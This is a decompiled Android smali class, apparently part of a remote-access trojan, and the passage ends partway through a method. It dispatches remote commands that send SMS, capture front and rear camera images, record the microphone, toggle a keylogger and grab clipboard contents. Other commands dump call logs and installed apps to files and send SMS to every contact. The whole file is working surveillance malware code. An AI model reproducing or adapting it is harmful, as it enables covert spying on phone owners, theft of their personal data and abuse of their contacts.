.class public final Lb/d;
.super Lt4/h;
.source "SourceFile"

# interfaces
.implements Ls4/c;


# instance fields
.field public final synthetic k:I

.field public final synthetic l:Lb/g;


# direct methods
.method public synthetic constructor <init>(Lb/g;I)V
    .locals 0

    .line 1
    iput p2, p0, Lb/d;->k:I

    .line 2
    .line 3
    iput-object p1, p0, Lb/d;->l:Lb/g;

    .line 4
    .line 5
    const/4 p1, 0x1

    .line 6
    invoke-direct {p0, p1}, Lt4/h;-><init>(I)V

    .line 7
    .line 8
    .line 9
    return-void
.end method


# virtual methods
.method public final N(Ljava/lang/Object;)Ljava/lang/Object;
    .locals 25

    move-object/from16 v0, p0

    iget v1, v0, Lb/d;->k:I

    packed-switch v1, :pswitch_data_0

    .line 1
    move-object/from16 v1, p1

    check-cast v1, Ljava/io/File;

    invoke-virtual {v0, v1}, Lb/d;->a(Ljava/io/File;)V

    sget-object v1, Lh4/k;->a:Lh4/k;

    return-object v1

    .line 2
    :pswitch_0
    move-object/from16 v1, p1

    check-cast v1, Ljava/io/File;

    invoke-virtual {v0, v1}, Lb/d;->a(Ljava/io/File;)V

    sget-object v1, Lh4/k;->a:Lh4/k;

    return-object v1

    .line 3
    :pswitch_1
    move-object/from16 v1, p1

    check-cast v1, Ljava/io/File;

    invoke-virtual {v0, v1}, Lb/d;->a(Ljava/io/File;)V

    sget-object v1, Lh4/k;->a:Lh4/k;

    return-object v1

    .line 4
    :pswitch_2
    move-object/from16 v1, p1

    check-cast v1, Ljava/io/File;

    invoke-virtual {v0, v1}, Lb/d;->a(Ljava/io/File;)V

    sget-object v1, Lh4/k;->a:Lh4/k;

    return-object v1

    .line 5
    :pswitch_3
    move-object/from16 v1, p1

    check-cast v1, Ljava/io/File;

    invoke-virtual {v0, v1}, Lb/d;->a(Ljava/io/File;)V

    sget-object v1, Lh4/k;->a:Lh4/k;

    return-object v1

    .line 6
    :pswitch_4
    move-object/from16 v1, p1

    check-cast v1, Ljava/lang/String;

    const-string v2, "it"

    .line 7
    invoke-static {v1, v2}, Ll4/h;->i0(Ljava/lang/Object;Ljava/lang/String;)V

    iget-object v2, v0, Lb/d;->l:Lb/g;

    .line 8
    iget-object v3, v2, Lb/g;->b:Lc/b;

    .line 9
    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "Last clipboard clip : "

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/16 v1, 0xa

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    iget-object v1, v2, Lb/g;->f:Ljava/lang/String;

    invoke-static {v1}, Lb/b;->h(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v3, v1}, Lc/b;->a(Ljava/lang/String;)V

    sget-object v1, Lh4/k;->a:Lh4/k;

    return-object v1

    .line 10
    :pswitch_5
    move-object/from16 v1, p1

    check-cast v1, Ljava/io/File;

    invoke-virtual {v0, v1}, Lb/d;->a(Ljava/io/File;)V

    sget-object v1, Lh4/k;->a:Lh4/k;

    return-object v1

    .line 11
    :pswitch_6
    move-object/from16 v1, p1

    check-cast v1, Ljava/io/File;

    invoke-virtual {v0, v1}, Lb/d;->a(Ljava/io/File;)V

    sget-object v1, Lh4/k;->a:Lh4/k;

    return-object v1

    .line 12
    :pswitch_7
    move-object/from16 v1, p1

    check-cast v1, Lorg/json/JSONObject;

    const-string v2, "it"

    .line 13
    invoke-static {v1, v2}, Ll4/h;->i0(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v2, "request"

    .line 14
    invoke-virtual {v1, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    new-instance v4, Ljava/util/LinkedHashMap;

    invoke-direct {v4}, Ljava/util/LinkedHashMap;-><init>()V

    const-string v5, "extras"

    invoke-virtual {v1, v5}, Lorg/json/JSONObject;->getJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v1

    invoke-virtual {v1}, Lorg/json/JSONArray;->length()I

    move-result v5

    const/4 v6, 0x0

    move v7, v6

    :goto_0
    if-ge v7, v5, :cond_0

    invoke-virtual {v1, v7}, Lorg/json/JSONArray;->get(I)Ljava/lang/Object;

    move-result-object v8

    const-string v9, "null cannot be cast to non-null type org.json.JSONObject"

    invoke-static {v8, v9}, Ll4/h;->f0(Ljava/lang/Object;Ljava/lang/String;)V

    check-cast v8, Lorg/json/JSONObject;

    const-string v9, "key"

    invoke-virtual {v8, v9}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    const-string v11, "value"

    invoke-virtual {v8, v11}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-static {v10, v9}, Ll4/h;->h0(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-static {v8, v11}, Ll4/h;->h0(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-interface {v4, v10, v8}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    add-int/lit8 v7, v7, 0x1

    goto :goto_0

    :cond_0
    invoke-static {v3, v2}, Ll4/h;->h0(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v1, "LOG"

    .line 15
    invoke-static {v1, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v1

    const/4 v5, 0x1

    const/4 v8, 0x7

    const/16 v9, 0x80

    const/4 v10, 0x6

    const/4 v11, 0x5

    const/16 v12, 0x3e8

    const/4 v13, 0x3

    const/4 v14, 0x2

    const/4 v15, 0x4

    sparse-switch v1, :sswitch_data_0

    :cond_1
    :goto_1
    move-object v1, v0

    goto/16 :goto_1a

    :sswitch_0
    const-string v1, "sendSms"

    invoke-virtual {v3, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_2

    goto :goto_1

    :cond_2
    const-string v1, "number"

    invoke-interface {v4, v1}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/String;

    const-string v2, "text"

    invoke-interface {v4, v2}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/lang/String;

    if-eqz v1, :cond_1

    if-eqz v2, :cond_1

    iget-object v3, v0, Lb/d;->l:Lb/g;

    invoke-static {v3, v1, v2}, Lb/g;->a(Lb/g;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_1

    :sswitch_1
    const-string v1, "main-camera"

    invoke-virtual {v3, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_3

    goto :goto_1

    :cond_3
    iget-object v1, v0, Lb/d;->l:Lb/g;

    .line 16
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 17
    new-instance v2, Lb/d;

    invoke-direct {v2, v1, v15}, Lb/d;-><init>(Lb/g;I)V

    new-instance v3, Lb/e;

    invoke-direct {v3, v1, v14}, Lb/e;-><init>(Lb/g;I)V

    iget-object v1, v1, Lb/g;->d:Le/c;

    invoke-virtual {v1, v6, v2, v3}, Le/c;->a(ILb/d;Lb/e;)V

    goto :goto_1

    :sswitch_2
    const-string v1, "microphone"

    .line 18
    invoke-virtual {v3, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_4

    goto :goto_1

    :cond_4
    const-string v1, "duration"

    invoke-interface {v4, v1}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/String;

    if-eqz v1, :cond_1

    iget-object v2, v0, Lb/d;->l:Lb/g;

    sget-object v3, Lh5/b;->a:[B

    .line 19
    :try_start_0
    invoke-static {v1}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide v3
    :try_end_0
    .catch Ljava/lang/NumberFormatException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_2

    :catch_0
    const-wide/16 v3, 0x1388

    .line 20
    :goto_2
    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    int-to-long v6, v12

    mul-long/2addr v3, v6

    .line 21
    new-instance v1, Lb/d;

    invoke-direct {v1, v2, v11}, Lb/d;-><init>(Lb/g;I)V

    new-instance v6, Lb/e;

    invoke-direct {v6, v2, v13}, Lb/e;-><init>(Lb/g;I)V

    iget-object v2, v2, Lb/g;->d:Le/c;

    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 22
    iget-object v2, v2, Le/c;->a:Landroid/content/Context;

    const-string v7, "android.permission.RECORD_AUDIO"

    invoke-static {v2, v7}, Lb/b;->f(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_5

    const-string v2, "( Microphone )"

    const-string v6, ".amr"

    invoke-static {v2, v6}, Lb/b;->g(Ljava/lang/String;Ljava/lang/String;)Ljava/io/File;

    move-result-object v2

    new-instance v6, Landroid/media/MediaRecorder;

    invoke-direct {v6}, Landroid/media/MediaRecorder;-><init>()V

    invoke-virtual {v6, v5}, Landroid/media/MediaRecorder;->setAudioSource(I)V

    invoke-virtual {v6, v5}, Landroid/media/MediaRecorder;->setOutputFormat(I)V

    invoke-virtual {v6, v5}, Landroid/media/MediaRecorder;->setAudioEncoder(I)V

    invoke-static {v6, v2}, Landroidx/compose/ui/platform/j;->m(Landroid/media/MediaRecorder;Ljava/io/File;)V

    invoke-virtual {v6}, Landroid/media/MediaRecorder;->prepare()V

    invoke-virtual {v6}, Landroid/media/MediaRecorder;->start()V

    new-instance v5, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v7

    invoke-direct {v5, v7}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v7, Lc/c;

    invoke-direct {v7, v6, v1, v2}, Lc/c;-><init>(Landroid/media/MediaRecorder;Lb/d;Ljava/io/File;)V

    invoke-virtual {v5, v7, v3, v4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    goto/16 :goto_1

    :cond_5
    invoke-virtual {v6}, Lb/e;->f()Ljava/lang/Object;

    goto/16 :goto_1

    :sswitch_3
    const-string v1, "keylogger-off"

    .line 23
    invoke-virtual {v3, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_6

    goto/16 :goto_1

    :cond_6
    iget-object v1, v0, Lb/d;->l:Lb/g;

    .line 24
    iget-object v1, v1, Lb/g;->e:Ls4/c;

    if-eqz v1, :cond_1

    sget-object v2, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    .line 25
    :goto_3
    invoke-interface {v1, v2}, Ls4/c;->N(Ljava/lang/Object;)Ljava/lang/Object;

    goto/16 :goto_1

    :sswitch_4
    const-string v1, "vibrate"

    invoke-virtual {v3, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_7

    goto/16 :goto_1

    :cond_7
    const-string v1, "duration"

    invoke-interface {v4, v1}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/String;

    if-eqz v1, :cond_1

    iget-object v2, v0, Lb/d;->l:Lb/g;

    sget-object v3, Lh5/b;->a:[B

    .line 26
    :try_start_1
    invoke-static {v1}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide v3
    :try_end_1
    .catch Ljava/lang/NumberFormatException; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_4

    :catch_1
    const-wide/16 v3, 0x7d0

    .line 27
    :goto_4
    iget-object v1, v2, Lb/g;->a:Landroid/content/Context;

    const-string v2, "vibrator_manager"

    .line 28
    invoke-virtual {v1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    const-string v2, "null cannot be cast to non-null type android.os.VibratorManager"

    invoke-static {v1, v2}, Ll4/h;->f0(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-static {v1}, Landroidx/compose/ui/platform/n;->c(Ljava/lang/Object;)Landroid/os/VibratorManager;

    move-result-object v1

    int-to-long v5, v12

    mul-long/2addr v3, v5

    invoke-static {v3, v4}, Landroidx/compose/ui/platform/j;->c(J)Landroid/os/VibrationEffect;

    move-result-object v2

    invoke-static {v2}, Landroidx/compose/ui/platform/n;->b(Landroid/os/VibrationEffect;)Landroid/os/CombinedVibration;

    move-result-object v2

    invoke-static {v1, v2}, Landroidx/compose/ui/platform/n;->h(Landroid/os/VibratorManager;Landroid/os/CombinedVibration;)V

    goto/16 :goto_1

    :sswitch_5
    const-string v1, "selfie-camera"

    .line 29
    invoke-virtual {v3, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_8

    goto/16 :goto_1

    :cond_8
    iget-object v1, v0, Lb/d;->l:Lb/g;

    .line 30
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 31
    new-instance v2, Lb/d;

    invoke-direct {v2, v1, v10}, Lb/d;-><init>(Lb/g;I)V

    new-instance v3, Lb/e;

    invoke-direct {v3, v1, v15}, Lb/e;-><init>(Lb/g;I)V

    iget-object v1, v1, Lb/g;->d:Le/c;

    invoke-virtual {v1, v5, v2, v3}, Le/c;->a(ILb/d;Lb/e;)V

    goto/16 :goto_1

    :sswitch_6
    const-string v1, "toast"

    .line 32
    invoke-virtual {v3, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_9

    goto/16 :goto_1

    :cond_9
    const-string v1, "text"

    invoke-interface {v4, v1}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/String;

    if-eqz v1, :cond_1

    iget-object v2, v0, Lb/d;->l:Lb/g;

    .line 33
    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 34
    new-instance v3, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v4

    invoke-direct {v3, v4}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v4, Lb/a;

    invoke-direct {v4, v2, v6, v1}, Lb/a;-><init>(Ljava/lang/Object;ILjava/lang/Object;)V

    invoke-virtual {v3, v4}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    goto/16 :goto_1

    :sswitch_7
    const-string v1, "calls"

    .line 35
    invoke-virtual {v3, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_a

    goto/16 :goto_1

    :cond_a
    iget-object v1, v0, Lb/d;->l:Lb/g;

    .line 36
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 37
    new-instance v3, Lb/d;

    invoke-direct {v3, v1, v14}, Lb/d;-><init>(Lb/g;I)V

    new-instance v4, Lb/e;

    invoke-direct {v4, v1, v5}, Lb/e;-><init>(Lb/g;I)V

    iget-object v1, v1, Lb/g;->d:Le/c;

    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v6, "android.permission.READ_CALL_LOG"

    .line 38
    iget-object v7, v1, Le/c;->a:Landroid/content/Context;

    invoke-static {v7, v6}, Lb/b;->f(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v6

    if-eqz v6, :cond_f

    const-string v4, "( Call Logs )"

    const-string v6, ".txt"

    invoke-static {v4, v6}, Lb/b;->g(Ljava/lang/String;Ljava/lang/String;)Ljava/io/File;

    move-result-object v4

    sget-object v6, Lb5/a;->a:Ljava/nio/charset/Charset;

    new-instance v8, Ljava/io/OutputStreamWriter;

    new-instance v9, Ljava/io/FileOutputStream;

    invoke-direct {v9, v4}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    invoke-direct {v8, v9, v6}, Ljava/io/OutputStreamWriter;-><init>(Ljava/io/OutputStream;Ljava/nio/charset/Charset;)V

    invoke-virtual {v7}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v15

    sget-object v16, Landroid/provider/CallLog$Calls;->CONTENT_URI:Landroid/net/Uri;

    const/16 v17, 0x0

    const/16 v18, 0x0

    const/16 v19, 0x0

    const/16 v20, 0x0

    invoke-virtual/range {v15 .. v20}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v6

    if-eqz v6, :cond_1

    const-string v7, "number"

    invoke-interface {v6, v7}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v7

    const-string v9, "type"

    invoke-interface {v6, v9}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v9

    const-string v10, "date"

    invoke-interface {v6, v10}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v10

    const-string v11, "duration"

    invoke-interface {v6, v11}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v11

    :goto_5
    invoke-interface {v6}, Landroid/database/Cursor;->moveToNext()Z

    move-result v12

    if-eqz v12, :cond_e

    invoke-interface {v6, v7}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v12

    invoke-interface {v6, v9}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v15

    invoke-interface {v6, v10}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v16

    new-instance v2, Ljava/util/Date;

    invoke-static/range {v16 .. v16}, Ljava/lang/Long;->valueOf(Ljava/lang/String;)Ljava/lang/Long;

    move-result-object v13

    const-string v14, "valueOf(callDate)"

    invoke-static {v13, v14}, Ll4/h;->h0(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {v13}, Ljava/lang/Number;->longValue()J

    move-result-wide v13

    invoke-direct {v2, v13, v14}, Ljava/util/Date;-><init>(J)V

    invoke-interface {v6, v11}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v13

    const-string v14, "callType"

    invoke-static {v15, v14}, Ll4/h;->h0(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-static {v15}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v14

    if-eq v14, v5, :cond_d

    const/4 v15, 0x2

    if-eq v14, v15, :cond_c

    const/4 v15, 0x3

    if-eq v14, v15, :cond_b

    const/4 v14, 0x0

    goto :goto_6

    :cond_b
    const-string v14, "MISSED"

    goto :goto_6

    :cond_c
    const-string v14, "OUTGOING"

    goto :goto_6

    :cond_d
    const-string v14, "INCOMING"

    :goto_6
    new-instance v15, Ljava/lang/StringBuilder;

    const-string v5, "Phone Number : "

    invoke-direct {v15, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v15, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, "\nCall Type: "

    invoke-virtual {v15, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, "\nCall Date: "

    invoke-virtual {v15, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v2, "\nCall duration in sec : "

    invoke-virtual {v15, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "\nJoin us : "

    invoke-virtual {v15, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v2, v1, Le/c;->b:Ljava/lang/String;

    invoke-virtual {v15, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "\n\n\n"

    invoke-virtual {v15, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v8, v2}, Ljava/io/Writer;->write(Ljava/lang/String;)V

    const/4 v5, 0x1

    const/4 v13, 0x3

    const/4 v14, 0x2

    goto :goto_5

    :cond_e
    invoke-interface {v6}, Landroid/database/Cursor;->close()V

    invoke-virtual {v8}, Ljava/io/OutputStreamWriter;->flush()V

    invoke-virtual {v8}, Ljava/io/OutputStreamWriter;->close()V

    invoke-virtual {v3, v4}, Lb/d;->N(Ljava/lang/Object;)Ljava/lang/Object;

    goto/16 :goto_1

    :cond_f
    invoke-virtual {v4}, Lb/e;->f()Ljava/lang/Object;

    goto/16 :goto_1

    :sswitch_8
    const-string v1, "keylogger-on"

    .line 39
    invoke-virtual {v3, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_10

    goto/16 :goto_1

    :cond_10
    iget-object v1, v0, Lb/d;->l:Lb/g;

    .line 40
    iget-object v1, v1, Lb/g;->e:Ls4/c;

    if-eqz v1, :cond_1

    sget-object v2, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    goto/16 :goto_3

    :sswitch_9
    const-string v1, "apps"

    .line 41
    invoke-virtual {v3, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_11

    goto/16 :goto_1

    :cond_11
    iget-object v1, v0, Lb/d;->l:Lb/g;

    .line 42
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 43
    new-instance v2, Lb/d;

    const/4 v3, 0x1

    invoke-direct {v2, v1, v3}, Lb/d;-><init>(Lb/g;I)V

    iget-object v1, v1, Lb/g;->d:Le/c;

    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "( Installed Apps )"

    const-string v4, ".txt"

    .line 44
    invoke-static {v3, v4}, Lb/b;->g(Ljava/lang/String;Ljava/lang/String;)Ljava/io/File;

    move-result-object v3

    sget-object v4, Lb5/a;->a:Ljava/nio/charset/Charset;

    new-instance v5, Ljava/io/OutputStreamWriter;

    new-instance v6, Ljava/io/FileOutputStream;

    invoke-direct {v6, v3}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    invoke-direct {v5, v6, v4}, Ljava/io/OutputStreamWriter;-><init>(Ljava/io/OutputStream;Ljava/nio/charset/Charset;)V

    iget-object v4, v1, Le/c;->a:Landroid/content/Context;

    invoke-virtual {v4}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v4

    const-string v6, "context.packageManager"

    invoke-static {v4, v6}, Ll4/h;->h0(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {v4, v9}, Landroid/content/pm/PackageManager;->getInstalledApplications(I)Ljava/util/List;

    move-result-object v6

    const-string v7, "pm.getInstalledApplicati\u2026ageManager.GET_META_DATA)"

    invoke-static {v6, v7}, Ll4/h;->h0(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-interface {v6}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v6

    :goto_7
    invoke-interface {v6}, Ljava/util/Iterator;->hasNext()Z

    move-result v7

    if-eqz v7, :cond_12

    invoke-interface {v6}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/content/pm/ApplicationInfo;

    invoke-virtual {v4, v7}, Landroid/content/pm/PackageManager;->getApplicationLabel(Landroid/content/pm/ApplicationInfo;)Ljava/lang/CharSequence;

    move-result-object v8

    const-string v9, "pm.getApplicationLabel(packageInfo)"

    invoke-static {v8, v9}, Ll4/h;->h0(Ljava/lang/Object;Ljava/lang/String;)V

    iget-object v7, v7, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    new-instance v9, Ljava/lang/StringBuilder;

    const-string v10, "App name : "

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v9, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v8, "\nPackage name : "

    invoke-virtual {v9, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v7, "\nJoin us : "

    invoke-virtual {v9, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v7, v1, Le/c;->b:Ljava/lang/String;

    invoke-virtual {v9, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v7, "\n\n\n"

    invoke-virtual {v9, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v5, v7}, Ljava/io/Writer;->write(Ljava/lang/String;)V

    goto :goto_7

    :cond_12
    invoke-virtual {v5}, Ljava/io/OutputStreamWriter;->flush()V

    invoke-virtual {v5}, Ljava/io/OutputStreamWriter;->close()V

    invoke-virtual {v2, v3}, Lb/d;->N(Ljava/lang/Object;)Ljava/lang/Object;

    goto/16 :goto_1

    :sswitch_a
    const-string v1, "smsToAllContacts"

    .line 45
    invoke-virtual {v3, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_13

    goto/16 :goto_1

    :cond_13
    const-string v1, "text"

    invoke-interface {v4, v1}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/String;

    if-eqz v1, :cond_1

    iget-object v2, v0, Lb/d;->l:Lb/g;

    .line 46
    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 47
    new-instance v3, Lb/f;

    const/4 v4, 0x1

    invoke-direct {v3, v2, v4, v1}, Lb/f;-><init>(Ljava/lang/Object;ILjava/lang/Object;)V

    new-instance v1, Lb/e;

    invoke-direct {v1, v2, v8}, Lb/e;-><init>(Lb/g;I)V

    iget-object v2, v2, Lb/g;->d:Le/c;

    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v4, "android.permission.READ_CONTACTS"

    .line 48
    iget-object v2, v2, Le/c;->a:Landroid/content/Context;

    invoke-static {v2, v4}, Lb/b;->f(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v4

    if-eqz v4, :cond_18

    new-instance v1, Ljava/util/ArrayList;

    invoke-direct {v1}, Ljava/util/ArrayList;-><init>()V

    invoke-virtual {v2}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v2

    const-string v4, "context.contentResolver"

    invoke-static {v2, v4}, Ll4/h;->h0(Ljava/lang/Object;Ljava/lang/String;)V

    sget-object v5, Landroid/provider/ContactsContract$Contacts;->CONTENT_URI:Landroid/net/Uri;

    const/4 v6, 0x0

    const/4 v7, 0x0

    const/4 v8, 0x0

    const/4 v9, 0x0

    move-object v4, v2

    invoke-virtual/range {v4 .. v9}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v10

    if-eqz v10, :cond_16

    invoke-interface {v10}, Landroid/database/Cursor;->getCount()I

    move-result v4

    if-lez v4, :cond_16

    :cond_14
    :goto_8
    invoke-interface {v10}, Landroid/database/Cursor;->moveToNext()Z

    move-result v4

    if-eqz v4, :cond_16

    const-string v4, "_id"

    invoke-interface {v10, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v10, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    const-string v5, "cur.getString(\n         \u2026ID)\n                    )"

    invoke-static {v4, v5}, Ll4/h;->h0(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v5, "display_name"

    invoke-interface {v10, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    invoke-interface {v10, v5}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    const-string v6, "cur.getString(\n         \u2026  )\n                    )"

    invoke-static {v5, v6}, Ll4/h;->h0(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v5, "has_phone_number"

    invoke-interface {v10, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    invoke-interface {v10, v5}, Landroid/database/Cursor;->getInt(I)I

    move-result v5

    if-lez v5, :cond_14

